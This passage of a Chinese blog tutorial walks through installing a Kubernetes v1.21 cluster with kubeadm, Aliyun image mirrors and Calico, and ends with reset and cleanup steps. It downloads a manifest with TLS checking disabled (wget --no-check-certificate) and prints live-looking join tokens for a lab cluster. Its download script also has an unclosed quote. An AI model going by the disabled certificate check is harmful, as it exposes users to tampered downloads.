title="方式一：先下载镜像"></a>方式一：先下载镜像</h5><p> <strong>集群镜像准备</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubeadm config images list --kubernetes-version<span class="token operator">=</span>v1.21.0<span class="token comment">#返回如下</span>k8s.gcr.io/kube-apiserver:v1.21.0k8s.gcr.io/kube-controller-manager:v1.21.0k8s.gcr.io/kube-scheduler:v1.21.0k8s.gcr.io/kube-proxy:v1.21.0k8s.gcr.io/pause:3.4.1k8s.gcr.io/etcd:3.4.13-0k8s.gcr.io/coredns/coredns:v1.8.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>脚本下载</strong></p><blockquote><p>官网 k8s.gcr.io 由于网络原因下载不下来</p><p>这里选用镜像下载</p><p> registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F; 该镜像中 pause:3.4.1和 etcd:3.4.13-0 找不到 原因目前未知</p><p> registry.aliyuncs.com&#x2F;google_containers&#x2F; 目前可行 就用它了</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># vi image_download.sh</span><span class="token comment">#!/bin/bash</span><span class="token assign-left variable">images_list</span><span class="token operator">=</span>'registry.aliyuncs.com/google_containers/kube-apiserver:v1.21.0registry.aliyuncs.com/google_containers/kube-controller-manager:v1.21.0registry.aliyuncs.com/google_containers/kube-scheduler:v1.21.0registry.aliyuncs.com/google_containers/kube-proxy:v1.21.0registry.aliyuncs.com/google_containers/pause:3.4.1registry.aliyuncs.com/google_containers/etcd:3.4.13-0registry.aliyuncs.com/google_containers/coredns/coredns:v1.8.0<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable">$images_list</span><span class="token keyword">do</span>        <span class="token function">docker</span> pull <span class="token variable">$i</span><span class="token keyword">done</span><span class="token function">docker</span> save <span class="token parameter variable">-o</span> k8s-1-27-0.tar <span class="token variable">$images_list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>执行</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> image_download.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p><strong>然后执行集群初始化</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubeadm init --kubernetes-version<span class="token operator">=</span>v1.21.0 --pod-network-cidr<span class="token operator">=</span><span class="token number">10.244</span>.0.0/16 --apiserver-advertise-address<span class="token operator">=</span><span class="token number">192.168</span>.100.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h6 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h6><p>方式一执行<strong>集群初始化</strong>的时候还是会走k8s.gcr.io，所以应该从阿里云下下来后，重新tag 打成 k8s.gcr.io下面的包再执行初始化</p><h5 id="方式二：使用阿里云镜像"><a href="#方式二：使用阿里云镜像" class="headerlink" title="方式二：使用阿里云镜像"></a>方式二：使用阿里云镜像</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubeadm init --kubernetes-version<span class="token operator">=</span>v1.21.0 --pod-network-cidr<span class="token operator">=</span><span class="token number">10.244</span>.0.0/16 --apiserver-advertise-address<span class="token operator">=</span><span class="token number">192.168</span>.100.11 --image-repository<span class="token operator">=</span>registry.aliyuncs.com/google_containers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h6 id="遇到的问题-1"><a href="#遇到的问题-1" class="headerlink" title="遇到的问题"></a>遇到的问题</h6><p>failed to pull image registry.aliyuncs.com&#x2F;google_containers&#x2F;coredns&#x2F;coredns:v1.8.0</p><p>原因：</p><p><strong>安装时需要从 k8s.gcr.io 拉取镜像，但是该网站被我国屏蔽了，国内没法正常访问导致没法正常进行kubernetes正常安装,从Docker官方默认镜像平台拉取镜像并重新打tag的方式来绕过对 k8s.gcr.io 的访问</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#从docker官网拉取</span><span class="token function">docker</span> pull coredns/coredns:1.8.0<span class="token comment">#重新打标签</span><span class="token function">docker</span> tag coredns/coredns:1.8.0 registry.aliyuncs.com/google_containers/coredns/coredns:v1.8.0<span class="token comment"># 删除旧的镜像</span><span class="token function">docker</span> rmi coredns/coredns:1.8.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>此时会生成从节点加入主节点的链接</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>init<span class="token punctuation">]</span> Using Kubernetes version: v1.21.0<span class="token punctuation">[</span>preflight<span class="token punctuation">]</span> Running pre-flight checks<span class="token punctuation">[</span>preflight<span class="token punctuation">]</span> Pulling images required <span class="token keyword">for</span> setting up a Kubernetes cluster<span class="token punctuation">[</span>preflight<span class="token punctuation">]</span> This might take a minute or two, depending on the speed of your internet connection<span class="token punctuation">[</span>preflight<span class="token punctuation">]</span> You can also perform this action <span class="token keyword">in</span> beforehand using <span class="token string">'kubeadm config images pull'</span><span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Using certificateDir folder <span class="token string">"/etc/kubernetes/pki"</span><span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"ca"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"apiserver"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> apiserver serving cert is signed <span class="token keyword">for</span> DNS names <span class="token punctuation">[</span>kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local master01<span class="token punctuation">]</span> and IPs <span class="token punctuation">[</span><span class="token number">10.96</span>.0.1 <span class="token number">192.168</span>.100.11<span class="token punctuation">]</span><span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"apiserver-kubelet-client"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"front-proxy-ca"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"front-proxy-client"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"etcd/ca"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"etcd/server"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> etcd/server serving cert is signed <span class="token keyword">for</span> DNS names <span class="token punctuation">[</span>localhost master01<span class="token punctuation">]</span> and IPs <span class="token punctuation">[</span><span class="token number">192.168</span>.100.11 <span class="token number">127.0</span>.0.1 ::1<span class="token punctuation">]</span><span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"etcd/peer"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> etcd/peer serving cert is signed <span class="token keyword">for</span> DNS names <span class="token punctuation">[</span>localhost master01<span class="token punctuation">]</span> and IPs <span class="token punctuation">[</span><span class="token number">192.168</span>.100.11 <span class="token number">127.0</span>.0.1 ::1<span class="token punctuation">]</span><span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"etcd/healthcheck-client"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"apiserver-etcd-client"</span> certificate and key<span class="token punctuation">[</span>certs<span class="token punctuation">]</span> Generating <span class="token string">"sa"</span> key and public key<span class="token punctuation">[</span>kubeconfig<span class="token punctuation">]</span> Using kubeconfig folder <span class="token string">"/etc/kubernetes"</span><span class="token punctuation">[</span>kubeconfig<span class="token punctuation">]</span> Writing <span class="token string">"admin.conf"</span> kubeconfig <span class="token function">file</span><span class="token punctuation">[</span>kubeconfig<span class="token punctuation">]</span> Writing <span class="token string">"kubelet.conf"</span> kubeconfig <span class="token function">file</span><span class="token punctuation">[</span>kubeconfig<span class="token punctuation">]</span> Writing <span class="token string">"controller-manager.conf"</span> kubeconfig <span class="token function">file</span><span class="token punctuation">[</span>kubeconfig<span class="token punctuation">]</span> Writing <span class="token string">"scheduler.conf"</span> kubeconfig <span class="token function">file</span><span class="token punctuation">[</span>kubelet-start<span class="token punctuation">]</span> Writing kubelet environment <span class="token function">file</span> with flags to <span class="token function">file</span> <span class="token string">"/var/lib/kubelet/kubeadm-flags.env"</span><span class="token punctuation">[</span>kubelet-start<span class="token punctuation">]</span> Writing kubelet configuration to <span class="token function">file</span> <span class="token string">"/var/lib/kubelet/config.yaml"</span><span class="token punctuation">[</span>kubelet-start<span class="token punctuation">]</span> Starting the kubelet<span class="token punctuation">[</span>control-plane<span class="token punctuation">]</span> Using manifest folder <span class="token string">"/etc/kubernetes/manifests"</span><span class="token punctuation">[</span>control-plane<span class="token punctuation">]</span> Creating static Pod manifest <span class="token keyword">for</span> <span class="token string">"kube-apiserver"</span><span class="token punctuation">[</span>control-plane<span class="token punctuation">]</span> Creating static Pod manifest <span class="token keyword">for</span> <span class="token string">"kube-controller-manager"</span><span class="token punctuation">[</span>control-plane<span class="token punctuation">]</span> Creating static Pod manifest <span class="token keyword">for</span> <span class="token string">"kube-scheduler"</span><span class="token punctuation">[</span>etcd<span class="token punctuation">]</span> Creating static Pod manifest <span class="token keyword">for</span> <span class="token builtin class-name">local</span> etcd <span class="token keyword">in</span> <span class="token string">"/etc/kubernetes/manifests"</span><span class="token punctuation">[</span>wait-control-plane<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> the kubelet to boot up the control plane as static Pods from directory <span class="token string">"/etc/kubernetes/manifests"</span><span class="token builtin class-name">.</span> This can take up to 4m0s<span class="token punctuation">[</span>kubelet-check<span class="token punctuation">]</span> Initial <span class="token function">timeout</span> of 40s passed.<span class="token punctuation">[</span>apiclient<span class="token punctuation">]</span> All control plane components are healthy after <span class="token number">56.002741</span> seconds<span class="token punctuation">[</span>upload-config<span class="token punctuation">]</span> Storing the configuration used <span class="token keyword">in</span> ConfigMap <span class="token string">"kubeadm-config"</span> <span class="token keyword">in</span> the <span class="token string">"kube-system"</span> Namespace<span class="token punctuation">[</span>kubelet<span class="token punctuation">]</span> Creating a ConfigMap <span class="token string">"kubelet-config-1.21"</span> <span class="token keyword">in</span> namespace kube-system with the configuration <span class="token keyword">for</span> the kubelets <span class="token keyword">in</span> the cluster<span class="token punctuation">[</span>upload-certs<span class="token punctuation">]</span> Skipping phase. Please see --upload-certs<span class="token punctuation">[</span>mark-control-plane<span class="token punctuation">]</span> Marking the <span class="token function">node</span> master01 as control-plane by adding the labels: <span class="token punctuation">[</span>node-role.kubernetes.io/master<span class="token punctuation">(</span>deprecated<span class="token punctuation">)</span> node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers<span class="token punctuation">]</span><span class="token punctuation">[</span>mark-control-plane<span class="token punctuation">]</span> Marking the <span class="token function">node</span> master01 as control-plane by adding the taints <span class="token punctuation">[</span>node-role.kubernetes.io/master:NoSchedule<span class="token punctuation">]</span><span class="token punctuation">[</span>bootstrap-token<span class="token punctuation">]</span> Using token: 4x919n.wofqxskn85v5skmj<span class="token punctuation">[</span>bootstrap-token<span class="token punctuation">]</span> Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles<span class="token punctuation">[</span>bootstrap-token<span class="token punctuation">]</span> configured RBAC rules to allow Node Bootstrap tokens to get nodes<span class="token punctuation">[</span>bootstrap-token<span class="token punctuation">]</span> configured RBAC rules to allow Node Bootstrap tokens to post CSRs <span class="token keyword">in</span> order <span class="token keyword">for</span> nodes to get long term certificate credentials<span class="token punctuation">[</span>bootstrap-token<span class="token punctuation">]</span> configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token<span class="token punctuation">[</span>bootstrap-token<span class="token punctuation">]</span> configured RBAC rules to allow certificate rotation <span class="token keyword">for</span> all <span class="token function">node</span> client certificates <span class="token keyword">in</span> the cluster<span class="token punctuation">[</span>bootstrap-token<span class="token punctuation">]</span> Creating the <span class="token string">"cluster-info"</span> ConfigMap <span class="token keyword">in</span> the <span class="token string">"kube-public"</span> namespace<span class="token punctuation">[</span>kubelet-finalize<span class="token punctuation">]</span> Updating <span class="token string">"/etc/kubernetes/kubelet.conf"</span> to point to a rotatable kubelet client certificate and key<span class="token punctuation">[</span>addons<span class="token punctuation">]</span> Applied essential addon: CoreDNS<span class="token punctuation">[</span>addons<span class="token punctuation">]</span> Applied essential addon: kube-proxyYour Kubernetes control-plane has initialized successfully<span class="token operator">!</span>To start using your cluster, you need to run the following as a regular user:  <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token environment constant">$HOME</span>/.kube  <span class="token function">sudo</span> <span class="token function">cp</span> <span class="token parameter variable">-i</span> /etc/kubernetes/admin.conf <span class="token environment constant">$HOME</span>/.kube/config  <span class="token function">sudo</span> <span class="token function">chown</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-u</span><span class="token variable">)</span></span><span class="token builtin class-name">:</span><span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-g</span><span class="token variable">)</span></span> <span class="token environment constant">$HOME</span>/.kube/configAlternatively, <span class="token keyword">if</span> you are the root user, you can run:  <span class="token builtin class-name">export</span> <span class="token assign-left variable">KUBECONFIG</span><span class="token operator">=</span>/etc/kubernetes/admin.confYou should now deploy a pod network to the cluster.Run <span class="token string">"kubectl apply -f [podnetwork].yaml"</span> with one of the options listed at:  https://kubernetes.io/docs/concepts/cluster-administration/addons/Then you can <span class="token function">join</span> any number of worker nodes by running the following on each as root:kubeadm <span class="token function">join</span> <span class="token number">192.168</span>.100.11:6443 <span class="token parameter variable">--token</span> 4x919n.wofqxskn85v5skmj <span class="token punctuation">\</span>        --discovery-token-ca-cert-hash sha256:d0f8229aec07486e0f42181ef44069762b57910f1dd8d78edb9b5e64ccf82b9c <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后更新生成的信息 主节点执行(<strong>master01执行</strong>)</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token environment constant">$HOME</span>/.kube<span class="token function">sudo</span> <span class="token function">cp</span> <span class="token parameter variable">-i</span> /etc/kubernetes/admin.conf <span class="token environment constant">$HOME</span>/.kube/config<span class="token function">sudo</span> <span class="token function">chown</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-u</span><span class="token variable">)</span></span><span class="token builtin class-name">:</span><span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-g</span><span class="token variable">)</span></span> <span class="token environment constant">$HOME</span>/.kube/config<span class="token builtin class-name">export</span> <span class="token assign-left variable">KUBECONFIG</span><span class="token operator">=</span>/etc/kubernetes/admin.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>两个从节点（worker01,worker02）执行加入操作，然后在两个从节点 worker01 和worker02上使用kubeadm 加入操作</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubeadm <span class="token function">join</span> <span class="token number">192.168</span>.100.11:6443 <span class="token parameter variable">--token</span> 4x919n.wofqxskn85v5skmj <span class="token punctuation">\</span>        --discovery-token-ca-cert-hash sha256:d0f8229aec07486e0f42181ef44069762b57910f1dd8d78edb9b5e64ccf82b9c <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><blockquote><p>如果加入报错节点存在可以执行重置后重新加入 <code>kubeadm reset</code></p></blockquote><p>如果忘了可以使用下面的这行命令重新生成</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubeadm token create --print-join-command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>在主节点上查看从节点是否加入</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl  get <span class="token function">node</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="集群网络准备"><a href="#集群网络准备" class="headerlink" title="集群网络准备"></a>集群网络准备</h4><blockquote><p>使用calico部署集群网络</p><p>安装参考网址：<a href="https://projectcalico.docs.tigera.io/about/about-calico">https://projectcalico.docs.tigera.io/about/about-calico</a></p><p>看 <a href="https://docs.tigera.io/archive/v3.23/getting-started/kubernetes/requirements">https://docs.tigera.io/archive/v3.23/getting-started/kubernetes/requirements</a> 介绍</p><p>我们这里k8s用的版本是1.21.0 所对应的calico 版本是v3.23</p></blockquote><h5 id="第一种：基于operator安装calico"><a href="#第一种：基于operator安装calico" class="headerlink" title="第一种：基于operator安装calico"></a>第一种：基于operator安装calico</h5><h6 id="下载operator资源清单文件"><a href="#下载operator资源清单文件" class="headerlink" title="下载operator资源清单文件"></a>下载operator资源清单文件</h6><p>如果不能直接应用（网络原因 可以先找个下载下来再使用apply应用）</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 网络原因，宿主机(需要具备访问的条件)手动访问下面地址，将里面的内容放到tigera-operator.yaml中</span>https://projectcalico.docs.tigera.io/archive/v3.23/manifests/tigera-operator.yaml<span class="token function">mkdir</span> calicodir<span class="token builtin class-name">cd</span> calicodir<span class="token comment"># 应用资源清单文件，创建operator  </span>kubectl apply --server-side <span class="token parameter variable">-f</span> tigera-operator.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>上面文件过大  <code>--server-side</code> 目的解决 tigera-operator.yaml 过大导致创建失败的问题，停止使用 Client Side Apply（运行 kubectl apply 时的当前默认设置），而是使用 Server Side Apply，它不会将 last-applied-configuration 注释添加到对象。</p><p>kubectl delete -f tigera-operator.yaml 先删除再创建也可以</p><p>参考：<a href="https://www.cnblogs.com/lzjloveit/p/17223453.html">https://www.cnblogs.com/lzjloveit/p/17223453.html</a></p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 网络原因，宿主机(需要具备访问的条件)手动访问下面地址，将里面的内容放到custom-resources.yaml中</span>https://projectcalico.docs.tigera.io/archive/v3.23/manifests/custom-resources.yaml<span class="token comment">#打开 custom-resources.yaml文件将cidr 改为上面 kubeadm 初始化的时候设置的 --pod-network-cidr的配置信息</span>cidr: <span class="token number">192.168</span>.0.0/16  改为      cidr: <span class="token number">10.244</span>.0.0/16 <span class="token comment"># 执行是需要保证上面tigera-operator.yaml 已经执行成功</span>kubectl apply <span class="token parameter variable">-f</span> custom-resources.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h5 id="第二种-基于calico-yml安装"><a href="#第二种-基于calico-yml安装" class="headerlink" title="第二种:基于calico.yml安装"></a>第二种:基于calico.yml安装</h5><h6 id="下载calico配置文件"><a href="#下载calico配置文件" class="headerlink" title="下载calico配置文件"></a>下载calico配置文件</h6><blockquote><p>这里 也是使用3.23版本</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span>  https://docs.projectcalico.org/v3.23/manifests/calico.yaml  --no-check-certificate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这里下载不下来就本地下载后传入服务器</p><h6 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h6><figure><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">vi calico.yaml将# - name: CALICO_IPV4POOL_CIDR#   value: "192.168.0.0/16"修改为- name: CALICO_IPV4POOL_CIDR  value: "10.244.0.0/16"#然后直接搜索 CLUSTER_TYPE，找到下面这段- name: CLUSTER_TYPE   value: "k8s,bgp"#然后添加一个和 CLUSTER_TYPE 同级的IP_AUTODETECTION_METHOD字段，具体如下：# value 就是指定你的网卡名字，我这里网卡是 ens33，然后直接配置的通配符 ens.*- name: IP_AUTODETECTION_METHOD    value: "interface=ens.*"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p> 重点注意：<strong>这里不能添加时候不能使用tab只能使用空格键当做空格</strong>，不然创建的时候会报错</p><h6 id="手动加载镜像（由于网络原因）"><a href="#手动加载镜像（由于网络原因）" class="headerlink" title="手动加载镜像（由于网络原因）"></a>手动加载镜像（由于网络原因）</h6><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@master01 calicodir<span class="token punctuation">]</span><span class="token comment"># cat calico.yaml |grep 'image:'</span>          image: docker.io/calico/cni:v3.23.5          image: docker.io/calico/cni:v3.23.5          image: docker.io/calico/node:v3.23.5          image: docker.io/calico/node:v3.23.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>calico 用的是3.23.5版本</p><p>手动下载，后上传服务器解压，cd 到images目录，使用 <code>docker load -i  xxxx.tar</code> 将镜像载入到当前服务器中</p><p><a href="https://github.com/projectcalico/calico/releases/tag/v3.23.5">https://github.com/projectcalico/calico/releases/tag/v3.23.5</a> </p><h6 id="修改calico-文件"><a href="#修改calico-文件" class="headerlink" title="修改calico 文件"></a>修改calico 文件</h6><blockquote><p> 修改镜从阿里云上海地区拉取</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> calico.yaml <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">'image:'</span><span class="token comment"># 此操作会保证当前calico配置文件使用的镜像和当前载入的镜像名一致</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s#docker.io/##g'</span> calico.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h6 id="执行创建calico-yaml创建网络"><a href="#执行创建calico-yaml创建网络" class="headerlink" title="执行创建calico.yaml创建网络"></a>执行创建calico.yaml创建网络</h6><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> calico.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>参考：</p><ul><li><p><a href="https://www.cnblogs.com/khtt/p/16563088.html">https://www.cnblogs.com/khtt/p/16563088.html</a></p></li><li><p><a href="https://www.lixueduan.com/posts/kubernetes/01-install/#3-%E5%AE%89%E8%A3%85-calicohttpsprojectcalicodocstigeraiogetting-startedkubernetesquickstart">https://www.lixueduan.com/posts/kubernetes/01-install/#3-%E5%AE%89%E8%A3%85-calicohttpsprojectcalicodocstigeraiogetting-startedkubernetesquickstart</a></p></li></ul><h5 id="验证网络情况删除重装相关"><a href="#验证网络情况删除重装相关" class="headerlink" title="验证网络情况删除重装相关"></a>验证网络情况删除重装相关</h5><h6 id="停止kubelet服务"><a href="#停止kubelet服务" class="headerlink" title="停止kubelet服务"></a>停止kubelet服务</h6><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl stop kubeletsystemctl disable kubelet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h6 id="使用-kubeadm-重置"><a href="#使用-kubeadm-重置" class="headerlink" title="使用 kubeadm 重置"></a>使用 kubeadm 重置</h6><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">kubeadm reset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h6 id="卸载相关应用"><a href="#卸载相关应用" class="headerlink" title="卸载相关应用"></a>卸载相关应用</h6><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum remove <span class="token parameter variable">-y</span> kubeadm kubectl kubelet kubernetes-cni kube*   <span class="token function">sudo</span> yum autoremove <span class="token parameter variable">-y</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h6 id="配置清理"><a href="#配置清理" class="headerlink" title="配置清理"></a>配置清理</h6><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/systemd/system/kubelet.service<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/systemd/system/kube*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h6 id="手动清理kubernetes"><a href="#手动清理kubernetes" class="headerlink" title="手动清理kubernetes"></a>手动清理kubernetes</h6><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.kube<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/kubernetes/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/kube*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>此时删除失败会有占用 可执行 <code>umount $(df -HT | grep &#39;/var/lib/kubelet/pods&#39; | awk &#39;&#123;print $7&#125;&#39;)</code> 后再清理</p><h4 id="子节点（worker01、worker02）加入主节点-master01"><a href="#子节点（worker01、worker02）加入主节点-master01" class="headerlink" title="子节点（worker01、worker02）加入主节点(master01)"></a>子节点（worker01、worker02）加入主节点(master01)</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubeadm <span class="token function">join</span> <span class="token number">192.168</span>.100.11:6443 <span class="token parameter variable">--token</span> vcc8xt.lc2t495ujjjf4yr9 --discovery-token-ca-cert-hash sha256:d0f8229aec07486e0f42181ef44069762b57910f1dd8d78edb9b5e64ccf82b9c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>注意：<strong>子节点也需要通过docker  load -i  xxx.tar 加载calico镜像</strong></p><p>然后删除现有的cali-node 会自动重启</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@master01 ~<span class="token punctuation">]</span><span class="token comment"># kubectl get pods -A</span>NAMESPACE     NAME                                       READY   STATUS    RESTARTS   AGEkube-system   calico-kube-controllers-74df58766b-sxtsr   <span class="token number">1</span>/1     Running   <span class="token number">2</span>          79mkube-system   calico-node-llkns                          <span class="token number">1</span>/1     Running   <span class="token number">2</span>          79mkube-system   calico-node-sths7                          <span class="token number">1</span>/1     Running   <span class="token number">0</span>          8m32skube-system   calico-node-t2mnv                          <span class="token number">1</span>/1     Running   <span class="token number">0</span>          13skube-system   coredns-545d6fc579-p2f8r                   <span class="token number">1</span>/1     Running   <span class="token number">2</span>          6h57mkube-system   coredns-545d6fc579-wl8dn                   <span class="token number">1</span>/1     Running   <span class="token number">2</span>          6h57mkube-system   etcd-master01                              <span class="token number">1</span>/1     Running   <span class="token number">6</span>          6h58mkube-system   kube-apiserver-master01                    <span class="token number">1</span>/1     Running   <span class="token number">6</span>          6h58mkube-system   kube-controller-manager-master01           <span class="token number">1</span>/1     Running   <span class="token number">6</span>          6h58mkube-system   kube-proxy-87l6q                           <span class="token number">1</span>/1     Running   <span class="token number">0</span>          28mkube-system   kube-proxy-c5r5l                           <span class="token number">1</span>/1     Running   <span class="token number">5</span>          6h57mkube-system   kube-proxy-vb8w9                           <span class="token number">1</span>/1     Running   <span class="token number">0</span>          29mkube-system   kube-scheduler-master01                    <span class="token number">1</span>/1     Running   <span class="token number">5</span>          6h58m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>删除命令</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl delete pod calico-node-xxx <span class="token parameter variable">-n</span> kube-system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>常用基础命令</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看所有的节点</span>kubectl get nodes<span class="token comment">#真实情况</span>kubectl get cs<span class="token comment">#查看管理相关的pod运行情况(calico也在这有版本再 calico-system)</span>kubectl get pods <span class="token parameter variable">-n</span> kube-system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 